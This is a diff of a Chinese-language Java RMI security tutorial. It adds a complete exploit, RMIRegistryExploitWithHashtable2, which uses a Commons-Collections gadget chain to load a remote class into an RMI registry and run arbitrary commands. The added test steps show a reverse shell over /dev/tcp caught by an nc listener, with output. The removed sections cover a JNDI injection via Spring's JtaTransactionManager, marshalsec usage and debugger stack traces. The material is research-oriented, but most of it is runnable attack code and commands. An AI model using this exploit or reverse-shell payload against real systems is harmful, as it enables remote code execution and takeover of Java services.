+        r.rebind( name, remoteProxy );
+    }
+}
+```
+
+用到CommonsCollections7，用到URLClassLoader，需要和DoSomething配合使用。故
+意演示调用DoSomething中的恶意成员函数Operator()，而不是调用恶意构造函数。
+没啥本质区别，不过用恶意构造函数的话，兼容性更广。
+
+14.3) RMIRegistryExploitWithHashtable2.java
+
+```java
+/*
+ * javac -encoding GBK -g -cp "commons-collections-3.1.jar:." RMIRegistryExploitWithHashtable2.java
+ */
+import java.io.*;
+import java.util.*;
+import java.lang.reflect.*;
+import java.rmi.Remote;
+import java.rmi.registry.*;
+import java.net.URL;
+import java.net.URLClassLoader;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.map.LazyMap;
+
+/*
+ * 从RMIRegistryExploitWithHashtable.java修改而来，优化输出
+ */
+public class RMIRegistryExploitWithHashtable2
+{
+    private static Throwable PrivateGetRootCause ( Throwable e )
+    {
+        Throwable cause = null;
+        Throwable ret   = e;
+
+        while ( null != ( cause = ret.getCause() ) && ( ret != cause ) )
+        {
+            ret = cause;
+        }
+        return ret;
+    }
+
+    @SuppressWarnings("unchecked")
+    public static void main ( String[] argv ) throws Exception
+    {
+        String          addr        = argv[0];
+        int             port        = Integer.parseInt( argv[1] );
+        String          evilurl     = argv[2];
+        String          evilclass   = argv[3];
+        String[]        evilparam   = Arrays.copyOfRange
+        (
+            argv,
+            4,
+            argv.length
+        );
+        Transformer[]   tarray      = new Transformer[]
+        {
+            new ConstantTransformer( URLClassLoader.class ),
+            new InvokerTransformer
+            (
+                "getMethod",
+                new Class[]
+                {
+                    String.class,
+                    Class[].class
+                },
+                new Object[]
+                {
+                    "newInstance",
+                    new Class[]
+                    {
+                        URL[].class
+                    }
+                }
+            ),
+            new InvokerTransformer
+            (
+                "invoke",
+                new Class[]
+                {
+                    Object.class,
+                    Object[].class
+                },
+                new Object[]
+                {
+                    null,
+                    new Object[]
+                    {
+                        new URL[]
+                        {
+                            new URL( evilurl )
+                        }
+                    }
+                }
+            ),
+            new InvokerTransformer
+            (
+                "loadClass",
+                new Class[]
+                {
+                    String.class
+                },
+                new Object[]
+                {
+                    evilclass
+                }
+            ),
+            new InvokerTransformer
+            (
+                "getMethod",
+                new Class[]
+                {
+                    String.class,
+                    Class[].class
+                },
+                new Object[]
+                {
+                    "Operator",
+                    new Class[]
+                    {
+                        Object[].class
+                    }
+                }
+            ),
+            new InvokerTransformer
+            (
+                "invoke",
+                new Class[]
+                {
+                    Object.class,
+                    Object[].class
+                },
+                new Object[]
+                {
+                    null,
+                    new Object[]
+                    {
+                        evilparam
+                    }
+                }
+            )
+        };
+        Transformer     tchain      = new ChainedTransformer( new Transformer[0] );
+        Map             normalMap_0 = new HashMap();
+        Map             normalMap_1 = new HashMap();
+        Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );
+        Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );
+        lazyMap_0.put( "scz", "same" );
+        lazyMap_1.put( "tDz", "same" );
+        Hashtable       ht          = new Hashtable();
+        ht.put( lazyMap_0, "value_0" );
+        ht.put( lazyMap_1, "value_1" );
+        lazyMap_1.remove( "scz" );
+        Field           f           = ChainedTransformer.class.getDeclaredField( "iTransformers" );
+        f.setAccessible( true );
+        f.set( tchain, tarray );
+        String          name        = "anything";
+        GeneralInvocationHandler3
+                        ih          = new GeneralInvocationHandler3( ht );
+        Remote          remoteProxy = ( Remote )Proxy.newProxyInstance
+        (
+            Remote.class.getClassLoader(),
+            new  Class[] { Remote.class },
+            ih
+        );
+        Registry        r           = LocateRegistry.getRegistry( addr, port );
+        try
+        {
+            r.rebind( name, remoteProxy );
+        }
+        catch ( Exception e )
+        {
+            System.out.print( PrivateGetRootCause( e ).getLocalizedMessage() );
+        }
+    }
+}
+```
+
+这个版本自己处理了异常，优化输出，不再显示调用栈回溯信息。
 
 14.4) 测试
 
@@ -1371,445 +2327,179 @@ javac -encoding GBK -g -cp ".:spring-tx-4.2.4.RELEASE.jar" EvilClientWithJtaTran
 
 .
 |
++---test0
+|
 +---test1
-|   |   EvilServer3.class (参《Java RMI入门(3)》)
-|   |   SomeDynamicServer3.class
-|   |   SomeInterface3.class
-|   |   SomeInterface3Impl.class
-|   |   spring-beans-4.2.4.RELEASE.jar
-|   |   spring-context-4.2.4.RELEASE.jar
-|   |   spring-core-4.2.4.RELEASE.jar
-|   |   spring-tx-4.2.4.RELEASE.jar
-|   |   commons-logging-1.2.jar
-|   |   javax.transaction-api-1.2.jar
-|   |
-|   \---any
-|           Message3.class
+|       DoSomething.class
 |
 +---test2
-|   |   EvilClientWithJtaTransactionManager.class
-|   |   SomeInterface3.class
-|   |   spring-tx-4.2.4.RELEASE.jar
-|   |   spring-core-4.2.4.RELEASE.jar
-|   |   commons-logging-1.2.jar
-|   |
-|   +---any
-|   |       Message3.class
-|   |
-|   \---org
-|       \---springframework
-|           \---transaction
-|               \---jta
-|                       JtaTransactionManager.class (fake版)
+|       RMIRegistryServer.class
+|       all.policy
+|       commons-collections-3.1.jar
 |
-\---testserverbase
-        ExploitObject.class (参《Java RMI入门(3)》)
+\---test3
+        RMIRegistryExploitWithHashtable.class
+        RMIRegistryExploitWithHashtable2.class
+        GeneralInvocationHandler3.class
+        commons-collections-3.1.jar
 
-这是充分必要的最小测试集，如欲复现，除非明确知道背后的机理，请勿乱加乱减文
-件。
-
-在testserverbase的父目录执行:
-
-python3 -m http.server -b 192.168.65.23 8080
+14.4.1) 测试1
 
 在test1目录执行:
 
-rmiregistry \
--J-Djava.class.path="spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar" \
-1099
-
-java \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-EvilServer3 attack http://192.168.65.23:8080/testserverbase/ ExploitObject
-
-java \
--Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
--Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
--cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:spring-beans-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:spring-context-4.2.4.RELEASE.jar:." \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeDynamicServer3 any
-
-当前Java版本是8u232，必须设置两个trustURLCodebase才能得手，8u40无此必要。
-SomeDynamicServer3在JNDI注入过程中扮演JNDI客户端的角色。
+python3 -m http.server -b 192.168.65.23 8080
 
 在test2目录执行:
 
+java_8_40 \
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
+
+在test3目录执行:
+
 java \
--cp ".:spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar" \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-EvilClientWithJtaTransactionManager any "msg from client" rmi://192.168.65.23:1099/attack
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryExploitWithHashtable2 192.168.65.23 1099 \
+http://192.168.65.23:8080/ DoSomething 1 \
+"ps -f -o pid,user,args"
 
-注意-cp中当前目录最先出现，这样才能使用fake版JtaTransactionManager。
+在客户端看到类似这样的输出:
 
-如果一切顺利，恶意构造函数ExploitObject()将在SomeDynamicServer3进程空间得
-到执行，输出"scz is here"，生成"/tmp/scz_is_here"。
+[
+   PID USER     COMMAND
+ 19439 scz      -bash
+ 25558 scz       \_ java -cp commons-collections-3.1.jar:. RMIRegistryExploitWithHashtable2 192.168.65.23 1099 http://192.168.65.23:8080/ DoSomething 1 ps -f -o pid,user,args
+  5238 scz      -bash
+ 24732 scz       \_ java_8_40 -Djava.rmi.server.hostname=192.168.65.23 -cp commons-collections-3.1.jar:. RMIRegistryServer 1099
+ 25568 scz           \_ ps -f -o pid,user,args
+  3594 scz      -bash
+ 24731 scz       \_ python3 -m http.server -b 192.168.65.23 8080
+]
 
-14.4.1) ExploitObject()调用栈回溯
+在test3目录执行:
 
-调试SomeDynamicServer3:
+java \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryExploitWithHashtable2 192.168.65.23 1099 \
+http://192.168.65.23:8080/ DoSomething 1 \
+"ls -l nonexist"
 
-java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
--Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
--Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
--cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:spring-beans-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:spring-context-4.2.4.RELEASE.jar:." \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeDynamicServer3 any
+在客户端看到类似这样的输出:
 
-jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+[
+ls: cannot access nonexist: No such file or directory
+]
 
-stop in ExploitObject.<init>
+说明stderr确实被转向到stdout了。
 
-  [1] ExploitObject.<init> (ExploitObject.java:9), pc = 0
-  [2] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
-  [3] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
-  [4] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
-  [5] java.lang.reflect.Constructor.newInstance (Constructor.java:423), pc = 79
-  [6] java.lang.Class.newInstance (Class.java:442), pc = 138
-  [7] javax.naming.spi.NamingManager.getObjectFactoryFromReference (NamingManager.java:163), pc = 46
-  [8] javax.naming.spi.NamingManager.getObjectInstance (NamingManager.java:319), pc = 94
-  [9] com.sun.jndi.rmi.registry.RegistryContext.decodeObject (RegistryContext.java:499), pc = 97
-  [10] com.sun.jndi.rmi.registry.RegistryContext.lookup (RegistryContext.java:138), pc = 75
-  [11] com.sun.jndi.toolkit.url.GenericURLContext.lookup (GenericURLContext.java:205), pc = 23
-  [12] javax.naming.InitialContext.lookup (InitialContext.java:417), pc = 6
-  [13] org.springframework.jndi.JndiTemplate$1.doInContext (JndiTemplate.java:155), pc = 5
-  [14] org.springframework.jndi.JndiTemplate.execute (JndiTemplate.java:87), pc = 7
-  [15] org.springframework.jndi.JndiTemplate.lookup (JndiTemplate.java:152), pc = 55
-  [16] org.springframework.jndi.JndiTemplate.lookup (JndiTemplate.java:179), pc = 2
-  [17] org.springframework.transaction.jta.JtaTransactionManager.lookupUserTransaction (JtaTransactionManager.java:571), pc = 52
-  [18] org.springframework.transaction.jta.JtaTransactionManager.initUserTransactionAndTransactionManager (JtaTransactionManager.java:448), pc = 23
-  [19] org.springframework.transaction.jta.JtaTransactionManager.readObject (JtaTransactionManager.java:1,206), pc = 16
-  [20] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
-  [21] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
-  [22] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
-  [23] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
-  [24] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
-  [25] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
-  [26] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
-  [27] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
-  [28] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
-  [29] sun.rmi.server.UnicastRef.unmarshalValue (UnicastRef.java:322), pc = 171
-  [30] sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked (UnicastServerRef.java:629), pc = 31
-  [31] sun.rmi.server.UnicastServerRef.unmarshalParameters (UnicastServerRef.java:617), pc = 23
-  [32] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:338), pc = 168
-  [33] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
-  [34] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
-  [35] java.security.AccessController.doPrivileged (native method)
-  [36] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
-  [37] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:573), pc = 185
-  [38] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:834), pc = 696
-  [39] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0 (TCPTransport.java:688), pc = 1
-  [40] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$4.143860313.run (null), pc = 4
-  [41] java.security.AccessController.doPrivileged (native method)
-  [42] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:687), pc = 58
-  [43] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,149), pc = 95
-  [44] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:624), pc = 5
-  [45] java.lang.Thread.run (Thread.java:748), pc = 11
+如果用8u232启动RMIRegistryServer，客户端看到的是:
 
-1至28号栈帧与"8.5.1) ExploitObject()调用栈回溯"小节完全相同。19号栈帧在调
-JtaTransactionManager.readObject()。29号栈帧是UnicastRef.unmarshalValue()，
-惹祸精。
+filter status: REJECTED
 
-这个调用栈就深了，先是通过RMI触发远程可控反序列化，再进一步触发JNDI注入。
+14.4.2) 测试2(connect shell)
 
-14.4.2) 用rmi-dumpregistry.nse观察周知端口
+在test0目录执行:
 
-$ nmap -n -Pn -p 1099 --script rmi-dumpregistry.nse 192.168.65.23
-
-PORT     STATE SERVICE
-1099/tcp open  java-rmi
-| rmi-dumpregistry:
-|   attack
-|     com.sun.jndi.rmi.registry.ReferenceWrapper_Stub
-|     @192.168.65.23:35819
-|     extends
-|       java.rmi.server.RemoteStub
-|       extends
-|         java.rmi.server.RemoteObject
-|   any
-|      implements java.rmi.Remote, SomeInterface3,
-|     extends
-|       java.lang.reflect.Proxy
-|       fields
-|           Ljava/lang/reflect/InvocationHandler; h
-|             java.rmi.server.RemoteObjectInvocationHandler
-|             @192.168.65.23:36658
-|             extends
-|_              java.rmi.server.RemoteObject
-
-EvilServer3直接绑定Reference，没有显式使用ReferenceWrapper，想不到背后还是
-涉及ReferenceWrapper_Stub。
-
-之前以为用rmi-dumpregistry.nse能看到AbstractPlatformTransactionManager的身
-影，想多了。看到了SomeInterface3。
-
-14.4.3) 用marshalsec测试
-
-假设目录结构是:
-
-.
-|
-+---test1
-|   |   marshalsec-0.0.3-SNAPSHOT-all.jar (替换掉EvilServer3.class)
-|   |   SomeDynamicServer3.class
-|   |   SomeInterface3.class
-|   |   SomeInterface3Impl.class
-|   |   spring-beans-4.2.4.RELEASE.jar
-|   |   spring-context-4.2.4.RELEASE.jar
-|   |   spring-core-4.2.4.RELEASE.jar
-|   |   spring-tx-4.2.4.RELEASE.jar
-|   |   commons-logging-1.2.jar
-|   |   javax.transaction-api-1.2.jar
-|   |
-|   \---any
-|           Message3.class
-|
-+---test2
-|   |   EvilClientWithJtaTransactionManager.class
-|   |   SomeInterface3.class
-|   |   spring-tx-4.2.4.RELEASE.jar
-|   |   spring-core-4.2.4.RELEASE.jar
-|   |   commons-logging-1.2.jar
-|   |
-|   +---any
-|   |       Message3.class
-|   |
-|   \---org
-|       \---springframework
-|           \---transaction
-|               \---jta
-|                       JtaTransactionManager.class (fake版)
-|
-\---testserverbase
-        ExploitObject.class (参《Java RMI入门(3)》)
-
-在testserverbase的父目录执行:
-
-python3 -m http.server -b 192.168.65.23 8080
+nc -l -p 7474
 
 在test1目录执行:
 
-rmiregistry \
--J-Djava.class.path="spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar" \
-1099
-
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.65.23:8080/testserverbase/#ExploitObject 2099
-
-java \
--Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
--Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
--cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:spring-beans-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:spring-context-4.2.4.RELEASE.jar:." \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeDynamicServer3 any
+python3 -m http.server -b 192.168.65.23 8080
 
 在test2目录执行:
 
+java_8_40 \
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
+
+在test3目录执行:
+
 java \
--cp ".:spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar" \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-EvilClientWithJtaTransactionManager any "msg from client" rmi://192.168.65.23:2099/whatever
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryExploitWithHashtable2 192.168.65.23 1099 \
+http://192.168.65.23:8080/ DoSomething 1 \
+"/bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1"
 
-15) 为什么Message3需要继承AbstractPlatformTransactionManager
+回到前面那个nc，已经得到一个shell，其uid对应RMIRegistryServer进程的euid。
 
-调试SomeDynamicServer3:
+14.4.3) 测试3(rmiregistry)
 
-java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
--Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
--Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
--cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:spring-beans-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:spring-context-4.2.4.RELEASE.jar:." \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeDynamicServer3 any
+在test1目录执行:
 
-jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+python3 -m http.server -b 192.168.65.23 8080
 
-stop in org.springframework.transaction.support.AbstractPlatformTransactionManager.readObject
+在test2目录执行:
 
-    org.springframework.transaction.jta.JtaTransactionManager(org.springframework.transaction.support.AbstractPlatformTransactionManager).readObject(java.io.ObjectInputStream) line: 1273
-    sun.reflect.NativeMethodAccessorImpl.invoke0(java.lang.reflect.Method, java.lang.Object, java.lang.Object[]) line: not available [native method]
-    sun.reflect.NativeMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 62
-    sun.reflect.DelegatingMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 43
-    java.lang.reflect.Method.invoke(java.lang.Object, java.lang.Object...) line: 498
-    java.io.ObjectStreamClass.invokeReadObject(java.lang.Object, java.io.ObjectInputStream) line: 1170
-    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readSerialData(java.lang.Object, java.io.ObjectStreamClass) line: 2177
-    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readOrdinaryObject(boolean) line: 2068
-    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject0(boolean) line: 1572
-    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject() line: 430
-    sun.rmi.server.UnicastRef.unmarshalValue(java.lang.Class<?>, java.io.ObjectInput) line: 322
-    sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked(java.lang.reflect.Method, java.io.ObjectInput) line: 629
-    sun.rmi.server.UnicastServerRef.unmarshalParameters(java.lang.Object, java.lang.reflect.Method, sun.rmi.server.MarshalInputStream) line: 617
-    sun.rmi.server.UnicastServerRef.dispatch(java.rmi.Remote, java.rmi.server.RemoteCall) line: 338
-    sun.rmi.transport.Transport$1.run() line: 200
-    sun.rmi.transport.Transport$1.run() line: 197
-    java.security.AccessController.doPrivileged(java.security.PrivilegedExceptionAction<T>, java.security.AccessControlContext) line: not available [native method]
-    sun.rmi.transport.tcp.TCPTransport(sun.rmi.transport.Transport).serviceCall(java.rmi.server.RemoteCall) line: 196
-    sun.rmi.transport.tcp.TCPTransport.handleMessages(sun.rmi.transport.Connection, boolean) line: 573
-    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0() line: 834
-    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0() line: 688
-    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$4.548107027.run() line: not available
-    java.security.AccessController.doPrivileged(java.security.PrivilegedAction<T>, java.security.AccessControlContext) line: not available [native method]
-    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run() line: 687
-    java.util.concurrent.ThreadPoolExecutor.runWorker(java.util.concurrent.ThreadPoolExecutor$Worker) line: 1149
-    java.util.concurrent.ThreadPoolExecutor$Worker.run() line: 624
-    java.lang.Thread.run() line: 748
+java_8_40 \
+-cp "commons-collections-3.1.jar" \
+-Djava.security.policy=all.policy \
+sun.rmi.registry.RegistryImpl 1099
 
---------------------------------------------------------------------------
-private void readObject(ObjectInputStream ois)
-    throws IOException, ClassNotFoundException
-{
-    ois.defaultReadObject();
-    /*
-     * 1276行，如果流程不经此处，this.logger将为null
-     */
-    this.logger = LogFactory.getLog(getClass());
-}
---------------------------------------------------------------------------
+在test3目录执行:
 
-如果Message3没有继承AbstractPlatformTransactionManager，则fake版
-JtaTransactionManager也没有继承AbstractPlatformTransactionManager；客户端
-提交的序列化数据中没有AbstractPlatformTransactionManager的信息，服务端反序
-列化时不会调用AbstractPlatformTransactionManager.readObject()，流程不会经
-过前述1276行，this.logger将为null。
+java \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryExploitWithHashtable2 192.168.65.23 1099 \
+http://192.168.65.23:8080/ DoSomething 1 \
+"ps -f -o pid,user,args"
 
-fake版JtaTransactionManager必须继承Message3，才能通过SomeDynamicServer3加
-载normal版JtaTransactionManager，这是SomeInterface3产生的约束。Java不支持
-多重继承，fake版JtaTransactionManager没法同时显式继承Message3、
-AbstractPlatformTransactionManager。最后只能让Message3先继承
-AbstractPlatformTransactionManager，再让fake版JtaTransactionManager继承
-Message3，以此满足fake版JtaTransactionManager必须继承
-AbstractPlatformTransactionManager的约束条件。一切都是为了让this.logger不
-为null。
+14.4.4) 远程测试
 
-在现实世界中，Message3可没这么"好心"地先去继承
-AbstractPlatformTransactionManager，比如Message2就是如此，此时this.logger
-将为null。
+在192.168.65.23上:
 
-stop in org.springframework.transaction.jta.JtaTransactionManager.readObject
+$ ls -l
+RMIRegistryServer.class
+commons-collections-3.1.jar
 
-    org.springframework.transaction.jta.JtaTransactionManager.readObject(java.io.ObjectInputStream) line: 1200
-    sun.reflect.NativeMethodAccessorImpl.invoke0(java.lang.reflect.Method, java.lang.Object, java.lang.Object[]) line: not available [native method]
-    sun.reflect.NativeMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 62
-    sun.reflect.DelegatingMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 43
-    java.lang.reflect.Method.invoke(java.lang.Object, java.lang.Object...) line: 498
-    java.io.ObjectStreamClass.invokeReadObject(java.lang.Object, java.io.ObjectInputStream) line: 1170
-    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readSerialData(java.lang.Object, java.io.ObjectStreamClass) line: 2177
-    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readOrdinaryObject(boolean) line: 2068
-    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject0(boolean) line: 1572
-    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject() line: 430
-    sun.rmi.server.UnicastRef.unmarshalValue(java.lang.Class<?>, java.io.ObjectInput) line: 322
-    sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked(java.lang.reflect.Method, java.io.ObjectInput) line: 629
-    sun.rmi.server.UnicastServerRef.unmarshalParameters(java.lang.Object, java.lang.reflect.Method, sun.rmi.server.MarshalInputStream) line: 617
-    sun.rmi.server.UnicastServerRef.dispatch(java.rmi.Remote, java.rmi.server.RemoteCall) line: 338
-    sun.rmi.transport.Transport$1.run() line: 200
-    sun.rmi.transport.Transport$1.run() line: 197
-    java.security.AccessController.doPrivileged(java.security.PrivilegedExceptionAction<T>, java.security.AccessControlContext) line: not available [native method]
-    sun.rmi.transport.tcp.TCPTransport(sun.rmi.transport.Transport).serviceCall(java.rmi.server.RemoteCall) line: 196
-    sun.rmi.transport.tcp.TCPTransport.handleMessages(sun.rmi.transport.Connection, boolean) line: 573
-    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0() line: 834
-    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0() line: 688
-    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$4.548107027.run() line: not available
-    java.security.AccessController.doPrivileged(java.security.PrivilegedAction<T>, java.security.AccessControlContext) line: not available [native method]
-    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run() line: 687
-    java.util.concurrent.ThreadPoolExecutor.runWorker(java.util.concurrent.ThreadPoolExecutor$Worker) line: 1149
-    java.util.concurrent.ThreadPoolExecutor$Worker.run() line: 624
-    java.lang.Thread.run() line: 748
+java \
+-Djava.rmi.server.hostname=192.168.65.20 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
 
-先命中AbstractPlatformTransactionManager.readObject()，再命中
-JtaTransactionManager.readObject()，前者是父类。
+用8u232启动RMIRegistryServer，此时先触发RegistryImpl.checkAccess()。
 
-stop in org.springframework.transaction.jta.JtaTransactionManager.lookupUserTransaction
-stop at org.springframework.transaction.jta.JtaTransactionManager:568
+在192.168.65.20上:
 
-    org.springframework.transaction.jta.JtaTransactionManager.lookupUserTransaction(java.lang.String) line: 568
-    org.springframework.transaction.jta.JtaTransactionManager.initUserTransactionAndTransactionManager() line: 448
-    org.springframework.transaction.jta.JtaTransactionManager.readObject(java.io.ObjectInputStream) line: 1206
-    sun.reflect.NativeMethodAccessorImpl.invoke0(java.lang.reflect.Method, java.lang.Object, java.lang.Object[]) line: not available [native method]
-    sun.reflect.NativeMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 62
-    sun.reflect.DelegatingMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 43
-    java.lang.reflect.Method.invoke(java.lang.Object, java.lang.Object...) line: 498
-    java.io.ObjectStreamClass.invokeReadObject(java.lang.Object, java.io.ObjectInputStream) line: 1170
-    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readSerialData(java.lang.Object, java.io.ObjectStreamClass) line: 2177
-    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readOrdinaryObject(boolean) line: 2068
-    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject0(boolean) line: 1572
-    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject() line: 430
-    sun.rmi.server.UnicastRef.unmarshalValue(java.lang.Class<?>, java.io.ObjectInput) line: 322
-    sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked(java.lang.reflect.Method, java.io.ObjectInput) line: 629
-    sun.rmi.server.UnicastServerRef.unmarshalParameters(java.lang.Object, java.lang.reflect.Method, sun.rmi.server.MarshalInputStream) line: 617
-    sun.rmi.server.UnicastServerRef.dispatch(java.rmi.Remote, java.rmi.server.RemoteCall) line: 338
-    sun.rmi.transport.Transport$1.run() line: 200
-    sun.rmi.transport.Transport$1.run() line: 197
-    java.security.AccessController.doPrivileged(java.security.PrivilegedExceptionAction<T>, java.security.AccessControlContext) line: not available [native method]
-    sun.rmi.transport.tcp.TCPTransport(sun.rmi.transport.Transport).serviceCall(java.rmi.server.RemoteCall) line: 196
-    sun.rmi.transport.tcp.TCPTransport.handleMessages(sun.rmi.transport.Connection, boolean) line: 573
-    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0() line: 834
-    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0() line: 688
-    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$4.548107027.run() line: not available
-    java.security.AccessController.doPrivileged(java.security.PrivilegedAction<T>, java.security.AccessControlContext) line: not available [native method]
-    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run() line: 687
-    java.util.concurrent.ThreadPoolExecutor.runWorker(java.util.concurrent.ThreadPoolExecutor$Worker) line: 1149
-    java.util.concurrent.ThreadPoolExecutor$Worker.run() line: 624
-    java.lang.Thread.run() line: 748
+$ ls -1
+RMIRegistryExploitWithHashtable.class
+RMIRegistryExploitWithHashtable2.class
+GeneralInvocationHandler3.class
+commons-collections-3.1.jar
 
---------------------------------------------------------------------------
-protected UserTransaction lookupUserTransaction(String userTransactionName)
-    throws TransactionSystemException
-{
-    try
-    {
-        /*
-         * 568行，若this.logger为null，流程在引触发空指针异常
-         */
-        if (this.logger.isDebugEnabled())
-        {
-            this.logger.debug("Retrieving JTA UserTransaction from JNDI location [" + userTransactionName + "]");
-        }
-        /*
-         * 571行，要想JtaTransactionManager利用链得手，流程必须至此
-         */
